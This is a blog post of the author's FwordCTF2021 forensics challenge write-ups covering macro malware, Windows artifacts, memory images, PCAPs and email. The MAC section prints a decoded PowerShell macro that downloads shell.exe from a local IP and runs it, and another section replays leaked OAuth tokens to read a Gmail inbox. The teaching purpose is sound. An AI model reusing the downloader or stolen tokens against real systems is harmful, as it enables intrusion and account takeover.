---
title: FwordCTF2021 - Writeups of my challenges
subtitle: I'm presenting to you the writeups of the challenges i managed to create during FwordCTF2021.

# Summary for listings and search engines
summary: I'm presenting to you the writeups of the challenges i managed to create during FwordCTF2021.
# Link this post with a project
projects: []

# Date published
date: "2021-08-27T00:00:00Z"

# Date updated
lastmod: "2021-08-293T00:00:00Z"

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: ''
  focal_point: ""
  placement: 2
  preview_only: false

authors:
- SemahBA

tags:
- CTF-Writeups
- FwordCTF

categories:
- Forensics
---
# FwordCTF2021

```
Title                      Category             Points            Flag
-------------------------- -------------------  ------- -----------------------------
MAC                           Forensics           998     FwordCTF{x_xWhiteuxx_x-192.168.1.9-Downloads-657.exe-chromebot.py}
eLearning                     Forensics           953     FwordCTF{SBA_192.168.1.9_dirsearch-nmap-wget_secret.txt_663cd2dfc9418f384d90c89a15319b3d}
Crypt                         Forensics           856     FwordCTF{08202021-05:03_ctf.user_23b2e901f3c3c3827a70589efd046be8}
BF                            Forensics           997     FwordCTF{f0r3n51c4_15n0t_4b0u7_70015_4f73r_411}
listening?                    Forensics           738     FwordCTF{email_forensics_is_interesting_73489nn7n4891}
```

# FwordCTF2021 Stats

![](https://i.imgur.com/vHjT96u.jpg)

# MAC |Forensics - 6 Solves

![](https://i.imgur.com/tS5rS5n.jpg)

## TL;DR
- Reading slack conversation

- dump the registries and get the username and file name

- analyse the macro to get the AttackerIP

- checking the task scheduler to find out that it's running chromebot.py which takes chrome env variable which has been changed with the macro.

## Solution

Starting by exploring the files in order to see how he communicated with the 'group of security group', in **Recent Documents in Autopsy** we see that there is slack there, so dumping slack messages.

PATH: **%AppData%\Roaming\Slack\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00\5**

example of Slack Parser: https://github.com/0xMohammed/Slack-Parser [ Again credit to [0xMohamedHassan](https://twitter.com/0xMohamedHassan)
]

![](https://i.imgur.com/In9OMRF.jpg)


so there is 3 users [cakix36502,Semah BenAli,x_xWhiteuxx_x] , one admin but since SemahBA created the group so he is **cakix36502**, the FileSenderUsername must be of the other two. 

**FileSenderUsername: Semah BenAli or x_xWhiteuxx_x**

Going to **%AppData%\Roaming\Slack\Storage\root-state.json** 

we get : **downloadPath":"C:\\Users\\FwordCTF\\Downloads\\securityupdate.doc.zip** -> ReceivedFileOriginalPath: **Downloads**

Now Checking the suspicious file it was password protected, going back to the messages from Slack, we find the password which is **fwordteam**

there is doc file, while opening asks for Enable editing, so macro one?

### Macro Analysis

I opened in a VM and started [CMD WATCHER](https://www.kahusecurity.com/posts/cmd_watcher_and_maldocs.html) and Enabled the editing and received this: 

![](https://i.imgur.com/JWeM0xM.jpg)

decoding it and we get:

```
$Managerrmo='Venezuelahwf';
$capacitoripk = '657';
$depositkjo='Internaljiw';
$Reverseengineeredifq=$env:userprofile+'\'+$capacitoripk+'.exe';
$Ovalnfc='Handcrafted_Plastic_Pantsrod';
$applicationpmi=&('ne'+'w-ob'+'ject') NEt.WEBCLIenT;
$Practical_Wooden_Gloveszih='httasdp://asd192asd.asd168asd.1asd.9asd/shasdellasd.easdxe'."Replace"("asd","");
$violetcuz='hackingtho';
foreach($Arizonavsf in $Practical_Wooden_Gloveszih){try{$applicationpmi."DO`Wnl`oadfIle"($Arizonavsf, $Reverseengineeredifq);
$Yemennoo='Borderswbi';
[System.Environment]::SetEnvironmentVariable('chrome.exe',$env:userprofile+'\'+$capacitoripk+'.exe')If ((&('Get-'+'It'+'em') $Reverseengineeredifq)."LEn`GTH" -ge 21057) {[Diagnostics.Process]::"S`TaRT"($Reverseengineeredifq);
$Bolivar_Fuertenor='SCSImlh';
break;
$Regionalbpb='Auto_Loan_Accounthzi'}}catch{}}$Liaisonqvc='bestofbreedqit
```

Looking at the code: 

- ``httasdp://asd192asdasd168asd1asd9asd/shasdellasdeasdxe'"Replace"("asd","");`` which is: ``http://192.168.1.9/shell.exe`` so the IP is **192.168.1.9** and The file will be downloaded under %userprofile%\657.exe

- **IPSourceOfTheDownloadedFile: 192.168.1.9**

- **NewMaliciousFile is 657.exe**

- Also the script is setting env variable chrome.exe value to 657.exe

Now The Last Part is left **WhatTriggeredTheMaliciousFile**

Okay going back to **Recent Documents** there is **Checking The Binary.lnk** which is under C:\Windows\System32\Tasks\Checking the Binary

Okay so this is from Task Scheduler.

Checking it -> C:\Windows\System32\Tasks\Checking the Binary

![](https://i.imgur.com/NgTmSj2.jpg)

there is:

```
<Exec>
      <Command>C:\Users\FwordCTF\AppData\Local\Microsoft\WindowsApps\python.exe</Command>
      <Arguments>chromebot.py</Arguments>
      <WorkingDirectory>C:\Program Files\Google\Chrome\Application\</WorkingDirectory>
</Exec>
 ```

Executing python script chromebot.py which is under **C:\Program Files\Google\Chrome\Application\***

Script content:

```python
import os
import pyautogui as pe
import time
chrome_path = os.getenv("chrome.exe")
os.startfile(chrome_path)
time.sleep(1)
# exeucting the binary
for i in range(2):
	pe.click(707,275)
time.sleep(5)
pe.hotkey('alt','f4')
print ("Okay so it's working fine")
```

So it's getting the value of **chrome.exe** which has been set before to 657.exe, going to the path and made it a startfile path, and double clicking the binary? 

So that's **WhatTriggeredTheNewMaliciousFile**

Flag Format : FwordCTF{FileSenderUsername-IPSourceOfTheDownloadedFile-ReceivedFileOriginalPath-NewMaliciousFile-WhatTriggeredTheNewMaliciousFile}

Putting all the pieces together:

Flag is: **FwordCTF{x_xWhiteuxx_x-192.168.1.9-Downloads-657.exe-chromebot.py}** 

# eLearning |Forensics - 23 Solves

![](https://i.imgur.com/JmfEb9a.jpeg)

## TL;DR

1 - Installed Apps, There is zenmap, Mailbird

2 - dump store.db to get the email received

3 - Powershell history to get IP and tools used

4 - renamed file from Powershell history, looking for it and get its content

## Solution

Going through files, **Program Files** shows that there is Mailbird installed, so looking [Messages Location](https://www.bitrecover.com/blog/where-does-mailbird-store-emails-and-contacts/)

Going to %APPDATA%\Local\Mailbird\Store\Store.db

![](https://i.imgur.com/tIsrma9.jpeg)

Checking the FTS_Messages table, we found the email from Fwordelearn, looking through the email we find this: 

``I'm SBA, and will be your constructor during this course.`` [sorry it is 'instructor']

So instructor is **SBA**

So looking for nmap files, didn't give much. But maybe launched from Powershell?

Looking through Powershell history: **%APPDATA%\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt**

and we find this: 

![](https://i.imgur.com/TSbfiIj.jpg)

Nice, so executing nmap, dirsearch and wget!

From the history file we can extract:
- IP: 192.168.1.9

- Tools: nmap, dirsearch, wget

- file which is secret.txt

- the secret.txt has been renamed to file.txt, so going to file.txt path: **Documents** and read its content: **663cd2dfc9418f384d90c89a15319b3d**

now we have everything:

Following the flag format: FwordCTF{InstructorName_targetIPTested_toolsUsedToReach TheFileandDownloadIt_NameOfFoundFile_Content}

Flag is: **FwordCTF{SBA_192.168.1.9_dirsearch-nmap-wget_secret.txt_663cd2dfc9418f384d90c89a15319b3d}**


# Crypt |Forensics - 40 Solves

![Description](https://i.imgur.com/bONs6u6.jpeg)

## TL;DR
**1 -** Checking installed app, find thunderbird.

**2 -** Extracting inbox and spam files.

**3 -** Get the private key and passphrase location

**4 -** Import key and get flag

## Solution

As always, the first thing to do after downloading the challenge file is identifying the profile to work with

```bash
vol.py -f challenge.raw imageinfo
```

the profile is : **Win7SP1x64**

Now checking cmdline, we will find many interesting things: 

```
C:\Windows\system32\NOTEPAD.EXE" C:\Users\SemahAB\AppData\Roaming\Thunderbird\Profiles\gb1i6asd.default-release\ImapMail\imap.yandex.com\INBOX
C:\Users\SemahAB\Downloads\Secret content\flag.txt.asc
C:\Windows\system32\NOTEPAD.EXE" C:\Users\SemahAB\AppData\Roaming\Thunderbird\Profiles\gb1i6asd.default-release\ImapMail\imap.yandex.com\Spam
```
Thunderbird related files which is email application, so this is our way since the challenge asks about DateOfReceive and Sender ...

So dumping those files and exploring them:

### INBOX

It's from ``ctf user`` okay so we got ourselves the Sender, and Date: ``Friday, 20 Aug 2021 5:03``

![](https://i.imgur.com/KTouqjB.jpeg)

And at the end of the mail, there is ``Don't forget about the decoding part we told you by phone !``

### SPAM

![](https://i.imgur.com/zrcAeRQ.jpeg)

So there is an environment variable ``345YACCESSTOGENERATEP455`` 

getting the envars 

```bash
vol.py --profile=Win7SP1x64 -f challenge.raw envars | grep -i 345YACCESSTOGENERATEP455
```

we get the value: ``pPaAsSpPhHrR445533`` 

### flag.txt.asc

![](https://i.imgur.com/kjxHSlJ.jpeg)

**PGP message**

Okay so putting all pieces together, we have an encrypted file and from the inbox mail ``importing this`` so this is the private key, and from the SPAM that's the passphrase?

Okay trying all this with the following steps: 

1 - Starting by decoding the base64 encoded string as mentioned in the mail and put it in a file called key

2 - import the key ``gpg --import key`` with passphrase **pPaAsSpPhHrR445533**

3 - decrypt the file: ``gpg --decrypt flag.txt.asc``

and yes we got the content: ``23b2e901f3c3c3827a70589efd046be8``

So perfect! Now putting all pieces together: 

FwordCTF{DateOfReceive_SenderUsername_contentofencrypted File} with the format mentioned in the description:

Flag : ``FwordCTF{08202021-05:03_ctf.user_23b2e901f3c3c3827a70589efd046be8}``

# BF |Forensics - 7 Solves

![](https://i.imgur.com/XYliZuY.jpeg)

## Credit

Credit to [0xMohamedHassan](https://twitter.com/0xMohamedHassan) for the excellent Challenge \o/.

## TL;DR
1. Check requests in the PCAP and find requests to cloudme which indicates cloudme software on the victim machine.

2. Search for cloudme exploit to find BoF vuln.

3. Check TCP requests to 8888.

4. dump the payload and analyze it with scdbg or sctest.

## Solution

Okay starting by exploring the PCAP as always. Following the requests, we see that there is requests to cloudme 

![](https://imgur.com/RoM6xUW.png) 

This indicates cloudme software on the victim machine. 

Looking for cloudme software exploits, and we find interesting results: 

[BOF Exploit](https://www.exploit-db.com/exploits/48389)

In the exploit there is: **s.connect((target,8888)** 

Wireshark filter: **tcp.port == 8888**

![](https://imgur.com/Kc8bXk9.png)

Copy data of Packet 48961 and reverse the hexdump.

Open the file in scdbg and launch it:

![](https://i.imgur.com/q4tktZy.jpg)

Flag : **FwordCTF{f0r3n51c4_15n0t_4b0u7_70015_4f73r_411}**

# listening? |Forensics - 54 Solves

![](https://i.imgur.com/RXF4ESC.jpeg)

## Credit

Credit to [0xMohamedHassan](https://twitter.com/0xMohamedHassan) for the excellent idea \o/ !

## TL;DR

1 - Sent data in ICMP Packet

2 - Oauth Creds

3 - Oauth playground and Read Mails

## Solution

Starting by exploring the PCAP

![](https://imgur.com/JNTuFTw.png)

from dns query there is **oauth2.googleapis.com**, we will leave this for now and keep looking into the PCAP.

![](https://imgur.com/Qe9rQKu.png)

we get this value: 

![](https://imgur.com/328ejQG.png)

so user-agent is: **google-oauth-playground** and got clientID, client_secret, refresh_token, and email.

Going to [oauth-playground](https://developers.google.com/oauthplayground/) and check **use our own OAuth credentials**

Go to Step2 and URL decode the refresh_token and put in **Refresh Token** and click on **Refresh access token**

![](https://i.imgur.com/ojK2XcO.jpeg)

now in Step 3, Set the Request URL to **https://gmail.googleapis.com/gmail/v1/users/fwordplayground@gmail.com/messages** 

[resource](https://developers.google.com/gmail/api/reference/rest/v1/users.messages/list)

To read it, just add /ID 

So going through the IDs, 

**https://gmail.googleapis.com/gmail/v1/users/fwordplayground@gmail.com/messages/17b7d85d21fc05ba** Will give the flag

![](https://i.imgur.com/SPIdwcC.jpeg)

Flag is: **FwordCTF{email_forensics_is_interesting_73489nn7n4891}** 
